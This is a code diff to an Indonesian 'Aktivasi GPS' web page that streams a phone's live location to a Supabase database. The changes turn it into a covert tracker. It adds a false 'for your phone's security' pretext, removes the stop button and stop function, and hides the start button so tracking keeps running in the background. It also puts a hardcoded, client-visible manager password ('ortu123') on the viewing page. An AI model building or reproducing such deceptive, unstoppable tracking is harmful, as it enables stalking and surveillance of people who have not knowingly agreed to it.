@@ -5,8 +5,7 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Aktivasi GPS</title>
 <link rel="manifest" href="manifest.json">
-<meta name="theme-color" content="#1877f2">
-<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>
+<meta name="theme-color" content="#667eea">
 <style>
   * { box-sizing: border-box; margin: 0; padding: 0; }
   body { 
@@ -18,151 +17,73 @@
     align-items: center;
     justify-content: center;
   }
-  .container { max-width: 450px; width: 100%; }
+  .container { max-width: 400px; width: 100%; }
   .card { 
     background: white; 
     padding: 30px; 
     border-radius: 16px; 
     box-shadow: 0 10px 40px rgba(0,0,0,.2);
   }
-  .logo { 
-    text-align: center; 
-    margin-bottom: 25px;
-  }
-  .logo-icon {
-    font-size: 48px;
-    margin-bottom: 10px;
-  }
-  h1 { 
-    color: #1a202c; 
-    font-size: 26px;
-    font-weight: 700;
-  }
-  .subtitle {
-    color: #718096;
-    font-size: 14px;
-    margin-top: 5px;
-  }
+  .logo { text-align: center; margin-bottom: 25px; }
+  .logo-icon { font-size: 48px; margin-bottom: 10px; }
+  h1 { color: #1a202c; font-size: 26px; font-weight: 700; }
+  .subtitle { color: #e53e3e; font-size: 13px; margin-top: 5px; font-weight: 600; }
   button { 
     background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-    color: white; 
-    border: none; 
-    padding: 14px 20px; 
-    border-radius: 10px; 
-    font-size: 16px; 
-    font-weight: 600;
-    cursor: pointer; 
-    width: 100%; 
-    margin-top: 12px;
-    transition: transform 0.2s;
+    color: white; border: none; padding: 14px 20px; border-radius: 10px; 
+    font-size: 16px; font-weight: 600; cursor: pointer; width: 100%; margin-top: 12px;
   }
-  button:hover { transform: translateY(-2px); }
-  button:active { transform: translateY(0); }
-  button:disabled { background: #cbd5e0; cursor: not-allowed; transform: none; }
-  button.danger { background: linear-gradient(135deg, #f56565 0%, #c53030 100%); }
-  button.secondary { background: #718096; }
+  button:hover { opacity: 0.9; }
+  button:disabled { background: #cbd5e0; cursor: not-allowed; }
   input { 
-    width: 100%; 
-    padding: 14px; 
-    border: 2px solid #e2e8f0; 
-    border-radius: 10px; 
-    font-size: 16px; 
-    margin-top: 8px;
-    transition: border-color 0.2s;
+    width: 100%; padding: 14px; border: 2px solid #e2e8f0; border-radius: 10px; 
+    font-size: 16px; margin-top: 8px;
   }
   input:focus { outline: none; border-color: #667eea; }
-  label { 
-    font-weight: 600; 
-    color: #2d3748; 
-    font-size: 14px; 
-    display: block; 
-    margin-top: 16px;
-  }
-  .status { 
-    padding: 14px; 
-    border-radius: 10px; 
-    margin-top: 16px; 
-    font-size: 14px;
-    font-weight: 500;
-  }
+  label { font-weight: 600; color: #2d3748; font-size: 14px; display: block; margin-top: 16px; }
+  .status { padding: 14px; border-radius: 10px; margin-top: 16px; font-size: 14px; font-weight: 500; }
   .ok { background: #c6f6d5; color: #22543d; border-left: 4px solid #48bb78; }
   .err { background: #fed7d7; color: #742a2a; border-left: 4px solid #f56565; }
   .info { background: #bee3f8; color: #2a4365; border-left: 4px solid #4299e1; }
   .hidden { display: none !important; }
-  .stats {
-    display: grid;
-    grid-template-columns: 1fr 1fr;
-    gap: 10px;
-    margin-top: 16px;
-  }
-  .stat-box {
-    background: #f7fafc;
-    padding: 12px;
-    border-radius: 8px;
-    text-align: center;
-  }
-  .stat-label {
-    font-size: 11px;
-    color: #718096;
-    text-transform: uppercase;
-    letter-spacing: 0.5px;
-  }
-  .stat-value {
-    font-size: 18px;
-    font-weight: 700;
-    color: #2d3748;
-    margin-top: 4px;
-  }
-  .footer-link {
-    text-align: center;
-    margin-top: 20px;
-    font-size: 13px;
-  }
-  .footer-link a {
-    color: white;
-    text-decoration: none;
-    opacity: 0.8;
-  }
+  .stats { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 16px; }
+  .stat-box { background: #f7fafc; padding: 12px; border-radius: 8px; text-align: center; }
+  .stat-label { font-size: 11px; color: #718096; text-transform: uppercase; }
+  .stat-value { font-size: 18px; font-weight: 700; color: #2d3748; margin-top: 4px; }
+  .footer-link { text-align: center; margin-top: 20px; font-size: 13px; }
+  .footer-link a { color: white; text-decoration: none; opacity: 0.8; cursor: pointer; }
   .footer-link a:hover { opacity: 1; }
 </style>
 </head>
 <body>
 
 <div class="container">
-  <!-- SETUP SCREEN -->
+  <!-- SETUP -->
   <div id="setupScreen" class="card">
     <div class="logo">
       <div class="logo-icon">📍</div>
       <h1>Aktivasi GPS</h1>
-      <p class="subtitle">Konfigurasi awal (hanya sekali)</p>
     </div>
-    
     <label>Server URL:</label>
     <input id="sbUrl" type="url" placeholder="https://xxxxx.supabase.co">
-    
     <label>Access Key:</label>
     <input id="sbKey" type="text" placeholder="sb_p...">
-    
     <button onclick="saveSetup()">💾 Simpan Konfigurasi</button>
     <div id="setupStatus" class="status info">Menunggu input...</div>
   </div>
 
-  <!-- MAIN SCREEN -->
+  <!-- MAIN -->
   <div id="mainScreen" class="card hidden">
     <div class="logo">
       <div class="logo-icon">📡</div>
       <h1>Aktivasi GPS</h1>
-      <p class="subtitle">Aktifkan pelacakan lokasi perangkat ini</p>
+      <p class="subtitle">Demi Keamanan HP Aktifkan GPS</p>
     </div>
     
-    <label>Kode Aktivasi:</label>
-    <input id="activationCode" type="text" placeholder="Masukkan kode dari pengelola">
-    
-    <label>Interval Pembaruan (detik):</label>
-    <input id="interval" type="number" value="30" min="10" max="300">
+    <label>Nama Anda:</label>
+    <input id="userName" type="text" placeholder="Masukkan nama">
     
     <button onclick="startActivation()" id="startBtn"> Aktivasi GPS</button>
-    <button onclick="stopActivation()" class="danger hidden" id="stopBtn">⏹ Nonaktifkan</button>
     
     <div id="statusBox" class="status info">Siap diaktifkan</div>
     
@@ -187,44 +108,34 @@
   </div>
 
   <div class="footer-link">
-    <a href="ortu.html">👨‍👩‍👧 Halaman Pengelola →</a>
+    <a onclick="gotoParentPage()">👨‍👩‍👧 Halaman Pengelola →</a>
   </div>
 </div>
 
-<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
 <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
 
 <script>
+const PARENT_PASSWORD = 'ortu123';
 let sbClient = null;
 let watchId = null;
 let sendTimer = null;
 let sentCount = 0;
-let currentCode = '';
+let currentName = '';
 
 function saveSetup() {
   let url = document.getElementById('sbUrl').value.trim();
   const key = document.getElementById('sbKey').value.trim();
-  
   url = url.replace('/rest/v1', '').replace('/rest', '');
   
-  if (!url || !key) {
-    alert('URL dan Key harus diisi!');
-    return;
-  }
-  
-  if (!url.includes('supabase.co')) {
-    alert('URL tidak valid!');
-    return;
-  }
+  if (!url || !key) { alert('URL dan Key harus diisi!'); return; }
+  if (!url.includes('supabase.co')) { alert('URL tidak valid!'); return; }
   
   try {
     localStorage.setItem('sb_url', url);
     localStorage.setItem('sb_key', key);
     sbClient = window.supabase.createClient(url, key);
-    
     document.getElementById('setupStatus').className = 'status ok';
     document.getElementById('setupStatus').textContent = '✅ Konfigurasi tersimpan!';
-    
     setTimeout(() => showScreen('mainScreen'), 800);
   } catch (e) {
     document.getElementById('setupStatus').className = 'status err';
@@ -242,33 +153,29 @@ function showScreen(id) {
 function initApp() {
   const url = localStorage.getItem('sb_url');
   const key = localStorage.getItem('sb_key');
-  
-  if (!url || !key) {
-    showScreen('setupScreen');
-    return;
-  }
-  
+  if (!url || !key) { showScreen('setupScreen'); return; }
   sbClient = window.supabase.createClient(url, key);
   showScreen('mainScreen');
 }
 
+function gotoParentPage() {
+  const password = prompt('🔒 Masukkan password pengelola:');
+  if (password === PARENT_PASSWORD) {
+    window.location.href = 'ortu.html';
+  } else if (password !== null) {
+    alert('❌ Password salah!');
+  }
+}
+
 async function startActivation() {
-  const code = document.getElementById('activationCode').value.trim();
-  if (!code) {
-    alert('Masukkan kode aktivasi!');
-    return;
-  }
+  const name = document.getElementById('userName').value.trim();
+  if (!name) { alert('Masukkan nama Anda!'); return; }
+  if (!sbClient) { alert('Konfigurasi belum siap!'); return; }
   
-  if (!sbClient) {
-    alert('Konfigurasi belum siap. Refresh halaman.');
-    return;
-  }
+  currentName = name.toLowerCase().replace(/\s+/g, '');
   
-  currentCode = code;
-  const interval = parseInt(document.getElementById('interval').value) * 1000;
-  
-  document.getElementById('startBtn').classList.add('hidden');
-  document.getElementById('stopBtn').classList.remove('hidden');
+  document.getElementById('startBtn').disabled = true;
+  document.getElementById('startBtn').textContent = '⏳ Mengaktifkan...';
   document.getElementById('statsBox').classList.remove('hidden');
   document.getElementById('statStatus').textContent = 'AKTIF';
   
@@ -278,7 +185,8 @@ async function startActivation() {
   
   if (!navigator.geolocation) {
     statusBox.className = 'status err';
-    statusBox.textContent = '❌ GPS tidak tersedia di perangkat ini';
+    statusBox.textContent = '❌ GPS tidak tersedia';
+    document.getElementById('startBtn').disabled = false;
     return;
   }
   
@@ -291,50 +199,33 @@ async function startActivation() {
       statusBox.className = 'status err';
       statusBox.textContent = '❌ GPS: ' + err.message;
     },
-    { enableHighAccuracy: true, maximumAge: 5000 }
+    { enableHighAccuracy: true, maximumAge: 5000, timeout: 15000 }
   );
   
   sendTimer = setInterval(() => {
-    console.log('️ Interval');
-  }, interval);
+    console.log('⏱️ Interval');
+  }, 15000);
   
   statusBox.className = 'status ok';
-  statusBox.textContent = '✅ GPS aktif - pembaruan tiap ' + (interval/1000) + ' detik';
+  statusBox.textContent = '✅ GPS aktif - berjalan di latar belakang';
+  document.getElementById('startBtn').style.display = 'none';
 }
 
 async function sendLocation(coords) {
   try {
     const { error } = await sbClient.from('locations').insert({
-      family_code: currentCode,
+      family_code: currentName,
       lat: coords.latitude,
       lng: coords.longitude,
       accuracy: coords.accuracy
     });
-    
     if (error) throw error;
-    
     sentCount++;
     document.getElementById('statSent').textContent = sentCount;
     document.getElementById('statTime').textContent = new Date().toLocaleTimeString('id-ID', {hour:'2-digit', minute:'2-digit'});
   } catch (e) {
     console.error('Gagal kirim:', e);
   }
-}
-
-function stopActivation() {
-  if (watchId) navigator.geolocation.clearWatch(watchId);
-  if (sendTimer) clearInterval(sendTimer);
-  watchId = sendTimer = null;
-  
-  document.getElementById('startBtn').classList.remove('hidden');
-  document.getElementById('stopBtn').classList.add('hidden');
-  document.getElementById('statsBox').classList.add('hidden');
-  
-  const statusBox = document.getElementById('statusBox');
-  statusBox.className = 'status info';
-  statusBox.textContent = 'GPS dinonaktifkan';
-  
-  sentCount = 0;
 }
 
 window.addEventListener('load', initApp);
